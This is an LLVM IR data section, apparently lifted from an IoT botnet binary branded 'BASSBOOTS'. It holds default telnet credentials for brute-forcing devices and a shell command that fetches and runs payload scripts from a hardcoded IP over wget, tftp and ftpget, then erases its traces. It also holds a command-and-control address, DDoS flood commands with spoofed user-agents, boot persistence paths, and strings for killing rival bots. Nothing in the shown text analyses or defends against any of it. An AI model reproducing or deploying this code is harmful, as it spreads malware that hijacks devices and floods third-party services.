source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%sockaddr = type { i32, [14 x i8] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%pollfd = type { i32, i16, i16 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_80a0.3 = constant i32 -352321502
@global_var_22344.7 = global i32 0
@global_var_22354.8 = global i32* @global_var_22344.7
@global_var_2284c.15 = global i32 0
@global_var_22348.18 = global i32 0
@global_var_e54c.22 = constant i32 -509558771
@global_var_22884.25 = global i32 0
@global_var_22888.26 = local_unnamed_addr global i32 0
@global_var_2288c.27 = local_unnamed_addr global i32 0
@global_var_224e0.30 = local_unnamed_addr global i32 4095
@global_var_224dc.33 = global i32 362436
@global_var_18434.35 = constant [7 x i8] c"(null)\00"
@global_var_26884.37 = local_unnamed_addr global i32 0
@global_var_1843c.39 = constant [8 x i8] c"/bin/sh\00"
@global_var_18444.41 = constant [3 x i8] c"sh\00"
@global_var_18448.43 = constant [3 x i8] c"-c\00"
@global_var_1844c.46 = constant i32 -1
@global_var_22864.48 = global i32 0
@global_var_18424.50 = constant [8 x i8] c"busybox\00"
@global_var_1842c.51 = constant i32 36
@global_var_18430.52 = constant i32 35
@global_var_224a0.53 = global [3 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18424.50, i32 0, i32 0), i8* bitcast (i32* @global_var_1842c.51 to i8*), i8* bitcast (i32* @global_var_18430.52 to i8*)]
@global_var_183ec.55 = constant [7 x i8] c"nvalid\00"
@global_var_183f4.56 = constant [6 x i8] c"ailed\00"
@global_var_183fc.57 = constant [9 x i8] c"ncorrect\00"
@global_var_18408.58 = constant [6 x i8] c"enied\00"
@global_var_18410.59 = constant [5 x i8] c"rror\00"
@global_var_18418.60 = constant [7 x i8] c"oodbye\00"
@global_var_18420.61 = constant [4 x i8] c"bad\00"
@global_var_22480.62 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_183ec.55, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_183f4.56, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_183fc.57, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18408.58, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18410.59, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18418.60, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_18420.61, i32 0, i32 0)]
@global_var_2286c.64 = global i32 0
@global_var_22870.65 = local_unnamed_addr global i32 0
@global_var_28af0.67 = global i32 0
@global_var_1884c.69 = constant [6 x i8] c":>%$#\00"
@global_var_18854.76 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_28ae4.79 = global i32 0
@global_var_18370.81 = constant [15 x i8] c"/dev/netslink/\00"
@global_var_18380.82 = constant [6 x i8] c"/tmp/\00"
@global_var_18388.83 = constant [6 x i8] c"/var/\00"
@global_var_18390.84 = constant [6 x i8] c"/dev/\00"
@global_var_18398.85 = constant [10 x i8] c"/var/run/\00"
@global_var_183a4.86 = constant [10 x i8] c"/dev/shm/\00"
@global_var_183b0.87 = constant [6 x i8] c"/mnt/\00"
@global_var_183b8.88 = constant [7 x i8] c"/boot/\00"
@global_var_183c0.89 = constant [6 x i8] c"/usr/\00"
@global_var_183c8.90 = constant [6 x i8] c"/opt/\00"
@global_var_22440.91 = global [10 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_18370.81, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18380.82, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18388.83, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18390.84, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_18398.85, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_183a4.86, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_183b0.87, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_183b8.88, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_183c0.89, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_183c8.90, i32 0, i32 0)]
@global_var_2246c = external global i32
@global_var_18324.98 = constant [7 x i8] c"telnet\00"
@global_var_1832c.99 = constant [5 x i8] c"root\00"
@global_var_18334.100 = constant [8 x i8] c"default\00"
@global_var_18340.101 = constant [7 x i8] c"daemon\00"
@global_var_18348.102 = constant [8 x i8] c"support\00"
@global_var_18354.103 = constant i32 0
@global_var_18358.104 = constant [7 x i8] c"123456\00"
@global_var_18360.105 = constant [7 x i8] c"Zte521\00"
@global_var_18368.106 = constant [6 x i8] c"vizxv\00"
@global_var_223f4.107 = global [18 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18324.98, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1832c.99, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1832c.99, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1832c.99, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1832c.99, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1832c.99, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18334.100, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18340.101, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18348.102, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18324.98, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1832c.99, i32 0, i32 0), i8* bitcast (i32* @global_var_18354.103 to i8*), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18358.104, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18360.105, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18368.106, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18334.100, i32 0, i32 0), i8* bitcast (i32* @global_var_18354.103 to i8*), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18348.102, i32 0, i32 0)]
@global_var_18860.109 = constant [3 x i8] c"\0D\0A\00"
@global_var_22418.111 = global [9 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18324.98, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1832c.99, i32 0, i32 0), i8* bitcast (i32* @global_var_18354.103 to i8*), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18358.104, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18360.105, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18368.106, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18334.100, i32 0, i32 0), i8* bitcast (i32* @global_var_18354.103 to i8*), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18348.102, i32 0, i32 0)]
@global_var_224b0.113 = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_183ec.55, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_183f4.56, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_183fc.57, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18408.58, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18410.59, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18418.60, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_18420.61, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18424.50, i32 0, i32 0), i8* bitcast (i32* @global_var_1842c.51 to i8*), i8* bitcast (i32* @global_var_18430.52 to i8*)]
@global_var_18864.116 = constant i32 993090331
@global_var_188c4.118 = constant [5 x i8] c"sh\0D\0A\00"
@global_var_188cc.120 = constant [8 x i8] c"shell\0D\0A\00"
@global_var_18168.122 = constant [443 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188.166.150.230/bassboots.sh; chmod 777 bassboots.sh; sh bassboots.sh; tftp 188.166.150.230 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; tftp -r ktftp2.sh -g 188.166.150.230; chmod 777 ktftp2.sh; sh ktftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 188.166.150.230 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bassboots.sh ktftp1.sh ktftp2.sh ftp1.sh; rm -rf *;history -c\0D\0A\00"
@global_var_223f0.123 = local_unnamed_addr global [443 x i8]* @global_var_18168.122
@global_var_188d4.125 = constant [6 x i8] c"arfgG\00"
@global_var_188dc.126 = constant [9 x i8] c"HBiug655\00"
@global_var_188e8.127 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_188f8.128 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_1890c.129 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_18920.130 = constant [12 x i8] c"GJjyur67458\00"
@global_var_1892c.131 = constant [12 x i8] c"RYSDk747586\00"
@global_var_18938.132 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_18944.133 = constant [10 x i8] c"KHGK7985i\00"
@global_var_18950.134 = constant [11 x i8] c"yuituiILYF\00"
@global_var_1895c.135 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_1896c.136 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_18978.137 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_18988.138 = constant [9 x i8] c"ewqdcftr\00"
@global_var_18994.139 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_189a4.140 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_189b0.141 = constant [12 x i8] c"twehgbferhb\00"
@global_var_189bc.142 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_189c8.143 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_189d8.144 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_189e8.145 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_189f8.146 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_18a04.147 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_18a14.148 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_18a24.149 = constant [12 x i8] c"yteytietyue\00"
@global_var_18a30.150 = constant [9 x i8] c"qsortEQS\00"
@global_var_18a3c.151 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_18a4c.152 = constant [4 x i8] c"std\00"
@global_var_18a50.153 = constant [4 x i8] c"dts\00"
@global_var_18a54.154 = constant [4 x i8] c"lsk\00"
@global_var_18a58.155 = constant [4 x i8] c"kek\00"
@global_var_18a5c.156 = constant [6 x i8] c"smack\00"
@global_var_18a64.157 = constant [4 x i8] c"ily\00"
@global_var_18a68.158 = constant [4 x i8] c"tyf\00"
@global_var_18a6c.159 = constant [4 x i8] c"pos\00"
@global_var_18a70.160 = constant [6 x i8] c"cunts\00"
@global_var_18a78.161 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_188d4.125, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_188dc.126, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_188e8.127, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_188f8.128, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_1890c.129, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_18920.130, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1892c.131, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_18938.132, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_18944.133, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_18950.134, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1895c.135, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1896c.136, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_18978.137, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18988.138, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_18994.139, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_189a4.140, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_189b0.141, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_189bc.142, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_189c8.143, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_189d8.144, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_189e8.145, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_189f8.146, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_18a04.147, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_18a14.148, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_18a24.149, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18a30.150, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_18a3c.151, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_18a4c.152, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_18a50.153, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_18a54.154, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_18a58.155, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18a5c.156, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_18a64.157, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_18a68.158, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_18a6c.159, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18a70.160, i32 0, i32 0)]
@global_var_17478.163 = constant [64 x i8] c"Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)\00"
@global_var_174b8.164 = constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00"
@global_var_174fc.165 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00"
@global_var_17540.166 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00"
@global_var_17584.167 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00"
@global_var_175c8.168 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01\00"
@global_var_1760c.169 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00"
@global_var_17650.170 = constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00"
@global_var_176c0.171 = constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36\00"
@global_var_17734.172 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0\00"
@global_var_17780.173 = constant [135 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4\00"
@global_var_17808.174 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0\00"
@global_var_17854.175 = constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36\00"
@global_var_178c4.176 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36\00"
@global_var_17934.177 = constant [115 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56\00"
@global_var_179a8.178 = constant [117 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7\00"
@global_var_17a20.179 = constant [69 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\00"
@global_var_17a68.180 = constant [47 x i8] c"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)\00"
@global_var_17a98.181 = constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00"
@global_var_17ad8.182 = constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00"
@global_var_17b24.183 = constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A\00"
@global_var_17b9c.184 = constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00"
@global_var_17c0c.185 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36\00"
@global_var_17c7c.186 = constant [115 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\00"
@global_var_17cf0.187 = constant [147 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36\00"
@global_var_17d84.188 = constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00\00"
@global_var_17dcc.189 = constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)\00"
@global_var_17e14.190 = constant [64 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)\00"
@global_var_17e54.191 = constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)\00"
@global_var_17ed0.192 = constant [103 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\00"
@global_var_17f38.193 = constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)\00"
@global_var_17fb4.194 = constant [80 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\00"
@global_var_18004.195 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00"
@global_var_18058.196 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0\00"
@global_var_180ac.197 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0\00"
@global_var_18100.198 = constant [83 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0\00"
@global_var_18154.199 = constant [20 x i8] c"188.166.150.230:123\00"
@global_var_2235c.200 = global [37 x i8*] [i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_17478.163, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @global_var_174b8.164, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_174fc.165, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_17540.166, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_17584.167, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_175c8.168, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_1760c.169, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @global_var_17650.170, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_176c0.171, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_17734.172, i32 0, i32 0), i8* getelementptr inbounds ([135 x i8], [135 x i8]* @global_var_17780.173, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_17808.174, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @global_var_17854.175, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @global_var_178c4.176, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_17934.177, i32 0, i32 0), i8* getelementptr inbounds ([117 x i8], [117 x i8]* @global_var_179a8.178, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_17a20.179, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @global_var_17a68.180, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @global_var_17a98.181, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_17ad8.182, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @global_var_17b24.183, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @global_var_17b9c.184, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @global_var_17c0c.185, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_17c7c.186, i32 0, i32 0), i8* getelementptr inbounds ([147 x i8], [147 x i8]* @global_var_17cf0.187, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @global_var_17d84.188, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @global_var_17dcc.189, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_17e14.190, i32 0, i32 0), i8* getelementptr inbounds ([123 x i8], [123 x i8]* @global_var_17e54.191, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @global_var_17ed0.192, i32 0, i32 0), i8* getelementptr inbounds ([123 x i8], [123 x i8]* @global_var_17f38.193, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_17fb4.194, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_18004.195, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_18058.196, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_180ac.197, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @global_var_18100.198, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_18154.199, i32 0, i32 0)]
@global_var_18b08.202 = constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00"
@global_var_18b48.204 = constant [4 x i8] c"all\00"
@global_var_18b4c.206 = constant i32 44
@global_var_18b50.208 = constant [4 x i8] c"syn\00"
@global_var_18b54.210 = constant [4 x i8] c"rst\00"
@global_var_18b58.212 = constant [4 x i8] c"fin\00"
@global_var_18b5c.214 = constant [4 x i8] c"ack\00"
@global_var_18b60.216 = constant [4 x i8] c"psh\00"
@global_var_18b64.218 = constant [5 x i8] c"PING\00"
@global_var_18b6c.220 = constant [6 x i8] c"PUSSY\00"
@global_var_18b74.222 = constant [4 x i8] c"OFF\00"
@global_var_28aec.224 = global i32 0
@global_var_18b78.226 = constant [3 x i8] c"ON\00"
@global_var_18b7c.228 = constant [5 x i8] c"HTTP\00"
@global_var_18b84.231 = constant [38 x i8] c"HTTP %s Flooding %s:%d for %d seconds\00"
@global_var_18bac.233 = constant [4 x i8] c"UDP\00"
@global_var_18bb0.236 = constant [4 x i8] c"TCP\00"
@global_var_18bb4.238 = constant [4 x i8] c"STD\00"
@global_var_18bb8.240 = constant [5 x i8] c"STOP\00"
@global_var_2243c.245 = local_unnamed_addr global i32 -1
@global_var_223ec.247 = global [20 x i8]* @global_var_18154.199
@global_var_18bc0.249 = constant [8 x i8] c"8.8.8.8\00"
@global_var_18bc8.252 = constant [16 x i8] c"/proc/net/route\00"
@global_var_18bd8.254 = constant [11 x i8] c"\0900000000\09\00"
@global_var_22874.256 = global i32 0
@global_var_18be4.258 = constant [10 x i8] c"BASSBOOTS\00"
@global_var_18bf0.260 = constant i32 0
@global_var_18bf4.262 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@1 = constant i32 114
@global_var_18c0c.266 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_18c1c.268 = constant i32 47
@global_var_18c20.270 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_18c28.272 = constant i32 97
@global_var_18c2c.274 = constant [13 x i8] c"fork failed\0A\00"
@global_var_18c3c.278 = constant i32 993090331
@global_var_18ca4.283 = constant [9 x i8] c"LELIMDUP\00"
@global_var_18cb0.285 = constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00"
@global_var_18cc4.287 = constant [11 x i8] c"STOLENBOTS\00"
@global_var_18cd0.289 = constant [8 x i8] c"%s 2>&1\00"
@global_var_18cd8.291 = constant i32 32
@global_var_28aac.293 = global i32 0
@global_var_224e8 = external global i32
@global_var_224f0 = external local_unnamed_addr global i32
@global_var_28abc.303 = global i32 0
@global_var_22524.309 = global i32 0
@global_var_26888.311 = global i32 0
@global_var_126e8.313 = constant i32 -481296384
@global_var_fc0c.314 = constant i32 -442564544
@global_var_2688c.316 = global i32 0
@global_var_2253c.322 = global i32 2
@global_var_2250c.328 = global i32 0
@global_var_ffc4.329 = constant i32 -442564492
@global_var_22508.331 = global i32* bitcast (i8** @global_var_22540.298 to i32*)
@global_var_10184.342 = constant i32 -382910448
@global_var_13d98.343 = constant i32 -382909968
@global_var_13e54.344 = constant i32 -382910224
@global_var_19310.346 = constant i32 135270416
@global_var_192f4.348 = constant [6 x i8] c"(nil)\00"
@global_var_192fc.351 = constant [7 x i8] c"(null)\00"
@global_var_19304.353 = constant i32 2949163
@global_var_19390.356 = constant i32 16843008
@global_var_19378.358 = constant i32 327688
@global_var_19370.363 = constant [8 x i8] c" +0-#'I\00"
@global_var_19318.365 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_19358.367 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_1934b.369 = constant i32 117506048
@global_var_1934c.371 = constant i32 252117248
@global_var_1933c.373 = constant i32 331776
@global_var_1932c.375 = constant i32 335616
